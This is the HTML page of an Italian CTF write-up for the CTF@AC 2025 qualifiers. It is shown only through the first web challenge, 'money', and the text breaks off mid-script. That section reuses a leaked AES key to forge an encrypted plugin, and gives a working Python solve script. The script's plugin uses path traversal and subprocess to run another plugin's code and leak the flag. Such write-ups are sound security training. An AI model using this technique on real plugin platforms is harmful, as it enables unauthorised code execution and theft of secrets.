@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+<html lang="it" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CTF@AC 2025 Qualifiche | Paolo</title>
+<meta name="keywords" content="ctfatac, ctf, binary, crypto, web, ctfatac2025">
+<meta name="description" content="Alcune writeup delle qualifiche alla ctf CTF@AC edizione 2025.">
+<meta name="author" content="Paolo">
+<link rel="canonical" href="https://pascalctf.github.io/en/ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.60a7a0a9923d020b71b53396c3a1eaa79c12b0e020c91cc166667dfe8ed1086c.css" integrity="sha256-YKegqZI9AgtxtTOWw6Hqp5wSsOAgyRzBZmZ9/o7RCGw=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://pascalctf.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://pascalctf.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://pascalctf.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://pascalctf.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://pascalctf.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://pascalctf.github.io/en/ctf/ctfatac2025_quals/">
+<link rel="alternate" hreflang="it" href="https://pascalctf.github.io/it/ctf/ctfatac2025_quals/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.css" integrity="sha384-5TcZemv2l/9On385z///+d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.js" integrity="sha384-cMkvdD8LoxVzGF/RPUKAcvmm49FQ0oxwDF3BGKtDXcEc+T1b2N+teh/OJfpU0jr6" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/contrib/auto-render.min.js" integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          delimiters: [
+              {left: '$$', right: '$$', display: true},
+              {left: '$', right: '$', display: false},
+              {left: '\\(', right: '\\)', display: false},
+              {left: '\\[', right: '\\]', display: true}
+          ],
+          throwOnError : false
+        });
+    });
+</script>
+
+<meta property="og:url" content="https://pascalctf.github.io/it/ctf/ctfatac2025_quals/">
+  <meta property="og:site_name" content="Paolo">
+  <meta property="og:title" content="CTF@AC 2025 Qualifiche">
+  <meta property="og:description" content="Alcune writeup delle qualifiche alla ctf CTF@AC edizione 2025.">
+  <meta property="og:locale" content="it">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctf">
+    <meta property="article:published_time" content="2025-09-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-09-16T00:00:00+00:00">
+    <meta property="article:tag" content="Ctfatac">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Binary">
+    <meta property="article:tag" content="Crypto">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Ctfatac2025">
+    <meta property="og:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io">
+<meta name="twitter:title" content="CTF@AC 2025 Qualifiche">
+<meta name="twitter:description" content="Alcune writeup delle qualifiche alla ctf CTF@AC edizione 2025.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Capture The Flag 🚩",
+      "item": "https://pascalctf.github.io/it/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF@AC 2025 Qualifiche",
+      "item": "https://pascalctf.github.io/it/ctf/ctfatac2025_quals/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTF@AC 2025 Qualifiche",
+  "name": "CTF@AC 2025 Qualifiche",
+  "description": "Alcune writeup delle qualifiche alla ctf CTF@AC edizione 2025.",
+  "keywords": [
+    "ctfatac", "ctf", "binary", "crypto", "web", "ctfatac2025"
+  ],
+  "articleBody": "CTF@AC 2025 Qualifiche Web 🌐 money Analisi La challenge espone una dashboard minimale che supporta plugin di terze parti. Quando carichiamo un plugin, la piattaforma ci permette anche di scaricare quelli esistenti (incluso l’ufficiale flag.plugin).\nExploit Dopo aver scaricato flag.plugin, notiamo che è cifrato. Il file server.py contiene sia la chiave sia la funzione per decifrarlo, quindi possiamo decifrarlo in locale usando decrypt_file.\nKEY = b\"SECRET_KEY!123456XXXXXXXXXXXXXXX\" def decrypt_file(input_path, output_path, key): with open(input_path, \"rb\") as f: data = f.read() iv = data[:16] ciphertext = data[16:] cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size) with open(output_path, \"wb\") as f: f.write(plaintext) Il init.py del flag.plugin decifrato contiene il seguente codice:\nimport json, sqlite3, pathlib, time, uuid import os plugin_dir = pathlib.Path(__file__).resolve().parent manifest_path = plugin_dir / \"plugin_manifest.json\" name, version = \"Widget\", \"1.0.0\" if manifest_path.exists(): try: m = json.loads(manifest_path.read_text()) name = m.get(\"name\", name) version = m.get(\"version\", version) except Exception: pass thumb = thumb = f''' ",
+  "wordCount" : "6162",
+  "inLanguage": "it",
+  "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io","datePublished": "2025-09-16T00:00:00Z",
+  "dateModified": "2025-09-16T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Paolo"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://pascalctf.github.io/it/ctf/ctfatac2025_quals/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Paolo",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://pascalctf.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://pascalctf.github.io/it/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://pascalctf.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://pascalctf.github.io/en/" title="🇬🇧 En"
+                            aria-label=":uk: En">🇬🇧 En</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://pascalctf.github.io/it/projects/" title="📒 Progetti">
+                    <span>📒 Progetti</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://pascalctf.github.io/it/ctf/" title="⚙ Writeups">
+                    <span>⚙ Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://pascalctf.github.io/it/competitions/" title="🏆 Competizioni">
+                    <span>🏆 Competizioni</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://pascalctf.github.io/it/sponsors/" title="🚀 Sponsors">
+                    <span>🚀 Sponsors</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://pascalctf.github.io/it/">Home</a>&nbsp;»&nbsp;<a href="https://pascalctf.github.io/it/ctf/">Capture The Flag 🚩</a></div>
+    <h1 class="post-title entry-hint-parent">
+      CTF@AC 2025 Qualifiche
+    </h1>
+    <div class="post-description">
+      Alcune writeup delle qualifiche alla ctf CTF@AC edizione 2025.
+    </div>
+    <div class="post-meta"><span title='2025-09-16 00:00:00 +0000 UTC'>settembre 16, 2025</span>&nbsp;·&nbsp;29 minuti&nbsp;·&nbsp;6162 parole&nbsp;·&nbsp;Paolo&nbsp;|&nbsp;Traduzioni:
+<ul class="i18n_list">
+    <li>
+        <a href="https://pascalctf.github.io/en/ctf/ctfatac2025_quals/">🇬🇧 En</a>
+    </li>
+</ul>&nbsp;|&nbsp;<a href="https://github.com/PascalCTF/PascalCTF.github.io/blob/main/content/en/ctf/ctfatac2025_quals.md" rel="noopener noreferrer edit" target="_blank">Suggerisci delle modifiche</a>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Indice contenuti</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web-">Web 🌐</a>
+      <ul>
+        <li><a href="#money">money</a></li>
+        <li><a href="#random-gallery">Random Gallery</a></li>
+        <li><a href="#theme-generator">Theme-Generator</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-">Binary exploitation 🏴‍☠️</a>
+      <ul>
+        <li><a href="#sigdance">Sigdance</a></li>
+        <li><a href="#baby-bof">baby-bof</a></li>
+        <li><a href="#fini">fini</a></li>
+        <li><a href="#minecrafty">Minecrafty</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse-engineering-">Reverse engineering ⚙️</a>
+      <ul>
+        <li><a href="#pythonese">Pythonese</a></li>
+        <li><a href="#ironevil">Ironevil</a></li>
+        <li><a href="#pixel-gate">Pixel Gate</a></li>
+      </ul>
+    </li>
+    <li><a href="#cryptography-">Cryptography 🔑</a>
+      <ul>
+        <li><a href="#repeated-rsa">Repeated RSA</a></li>
+        <li><a href="#sss">SSS</a></li>
+        <li><a href="#xorbitant">XORbitant</a></li>
+      </ul>
+    </li>
+    <li><a href="#miscellaneous-">Miscellaneous 🐧</a>
+      <ul>
+        <li><a href="#octojail">Octojail</a></li>
+        <li><a href="#onions1">onions1</a></li>
+        <li><a href="#escaping-barcellona">Escaping Barcellona</a></li>
+        <li><a href="#onions2">Onions2</a></li>
+        <li><a href="#disco-dance">Disco Dance</a></li>
+        <li><a href="#disco-rave">Disco Rave</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-">Forensics 🤖</a>
+      <ul>
+        <li><a href="#unknown-traffic-1">Unknown Traffic 1</a></li>
+        <li><a href="#unknown-traffic-2">Unknown Traffic 2</a></li>
+        <li><a href="#hidden-in-the-cartridge">Hidden in the Cartridge</a></li>
+        <li><a href="#baofeng">Baofeng</a></li>
+        <li><a href="#3rd-child">3rd child</a></li>
+      </ul>
+    </li>
+    <li><a href="#osint-">OSINT 🌏</a>
+      <ul>
+        <li><a href="#holiday-trip">Holiday Trip</a></li>
+        <li><a href="#prison">Prison</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="ctfac-2025-qualifiche">CTF@AC 2025 Qualifiche<a hidden class="anchor" aria-hidden="true" href="#ctfac-2025-qualifiche">#</a></h1>
+<p><img alt="ctf at ac logo" loading="lazy" src="/images/ctf@ac.png"></p>
+<h2 id="web-">Web 🌐<a hidden class="anchor" aria-hidden="true" href="#web-">#</a></h2>
+<h3 id="money">money<a hidden class="anchor" aria-hidden="true" href="#money">#</a></h3>
+<h4 id="analisi">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi">#</a></h4>
+<p>La challenge espone una dashboard minimale che supporta plugin di terze parti. Quando carichiamo un plugin, la piattaforma ci permette anche di scaricare quelli esistenti (incluso l’ufficiale <code>flag.plugin</code>).</p>
+<h4 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h4>
+<p>Dopo aver scaricato <code>flag.plugin</code>, notiamo che è cifrato. Il file <code>server.py</code> contiene sia la chiave sia la funzione per decifrarlo, quindi possiamo decifrarlo in locale usando <code>decrypt_file</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;SECRET_KEY!123456XXXXXXXXXXXXXXX&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="n">output_path</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
+</span></span></code></pre></div><p>Il <code>init.py</code> del <code>flag.plugin</code> decifrato contiene il seguente codice:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">sqlite3</span><span class="o">,</span> <span class="nn">pathlib</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">plugin_dir</span> <span class="o">=</span> <span class="n">pathlib</span><span class="o">.</span><span class="n">Path</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">parent</span>
+</span></span><span class="line"><span class="cl"><span class="n">manifest_path</span> <span class="o">=</span> <span class="n">plugin_dir</span> <span class="o">/</span> <span class="s2">&#34;plugin_manifest.json&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">name</span><span class="p">,</span> <span class="n">version</span> <span class="o">=</span> <span class="s2">&#34;Widget&#34;</span><span class="p">,</span> <span class="s2">&#34;1.0.0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">manifest_path</span><span class="o">.</span><span class="n">exists</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">manifest_path</span><span class="o">.</span><span class="n">read_text</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">version</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;version&#34;</span><span class="p">,</span> <span class="n">version</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">thumb</span> <span class="o">=</span> <span class="n">thumb</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;320&#34; height=&#34;180&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;rect x=&#34;0&#34; y=&#34;0&#34; width=&#34;320&#34; height=&#34;180&#34; fill=&#34;#eef&#34;/&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;text x=&#34;50%&#34; y=&#34;50&#34; dominant-baseline=&#34;middle&#34; text-anchor=&#34;middle&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">      font-size=&#34;48&#34; font-family=&#34;sans-serif&#34;&gt;🚩&lt;/text&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;text x=&#34;50%&#34; y=&#34;110&#34; dominant-baseline=&#34;middle&#34; text-anchor=&#34;middle&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">      font-size=&#34;16&#34; font-family=&#34;sans-serif&#34; fill=&#34;#444&#34;&gt;v</span><span class="si">{</span><span class="n">version</span><span class="si">}</span><span class="s1">&lt;/text&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;/svg&gt;&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">plugin_dir</span> <span class="o">/</span> <span class="s2">&#34;thumbnail.svg&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write_text</span><span class="p">(</span><span class="n">thumb</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">,</span><span class="s2">&#34;You ran this locally and did not set a dummy flag, dummy.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;You cannot see this MUHAHAHAHA:&#34;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
+</span></span></code></pre></div><p>In breve, <code>init.py</code> stampa la flag su stdout quando viene eseguito. Il server esegue l’<code>init.py</code> di un plugin durante l’upload (<code>/upload</code>). L’idea è sfruttare questo comportamento da un altro plugin:</p>
+<ul>
+<li>Per prima cosa, dobbiamo scoprire l’UID lato server del widget <code>flag</code>, così da conoscerne il nome della directory.</li>
+<li>Poi, dobbiamo creare un plugin malevolo il cui <code>init.py</code> usi un path traversal relativo (<code>../{uid}/init.py</code>) per eseguire l’<code>init.py</code> del flag plugin tramite <code>subprocess</code> e catturarne lo stdout.</li>
+<li>Infine, scrivere quello stdout in <code>index.html</code>, che la piattaforma ci renderizzerà.</li>
+</ul>
+<p>Perché l’exploit funzioni in modo affidabile, usare la struttura di cartelle seguente.</p>
+<h4 id="struttura-delle-cartelle-dellexploit">Struttura delle cartelle dell’exploit<a hidden class="anchor" aria-hidden="true" href="#struttura-delle-cartelle-dellexploit">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── plug
+</span></span><span class="line"><span class="cl">│   ├── icon.png (vuoto)
+</span></span><span class="line"><span class="cl">│   ├── init.py
+</span></span><span class="line"><span class="cl">│   └── plugin_manifest.json
+</span></span><span class="line"><span class="cl">└── solve.py
+</span></span></code></pre></div><h5 id="soluzione-in-python">Soluzione in Python<a hidden class="anchor" aria-hidden="true" href="#soluzione-in-python">#</a></h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">bs4</span><span class="o">,</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9035</span>
+</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s1">&#39;http://ctf.ac.upt.ro:&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">PORT</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">bs4</span><span class="o">.</span><span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s2">&#34;html.parser&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;img&#34;</span><span class="p">,</span> <span class="n">alt</span><span class="o">=</span><span class="s2">&#34;Flag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">img</span><span class="p">[</span><span class="s2">&#34;src&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag uid:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">import subprocess
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">result = subprocess.run([&#39;python&#39;, &#39;../</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">/init.py&#39;], capture_output=True, text=True)
+</span></span></span><span class="line"><span class="cl"><span class="s2">with open(&#39;index.html&#39;, &#39;w&#39;) as f:
+</span></span></span><span class="line"><span class="cl"><span class="s2">    f.write(result.stdout)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;plug/init.py&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;zip&#39;</span><span class="p">,</span> <span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="s1">&#39;../plug.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">],</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">cwd</span><span class="o">=</span><span class="s1">&#39;plug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;SECRET_KEY!123456XXXXXXXXXXXXXXX&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;plug.zip&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;myplugin.plugin&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">ciphertext</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
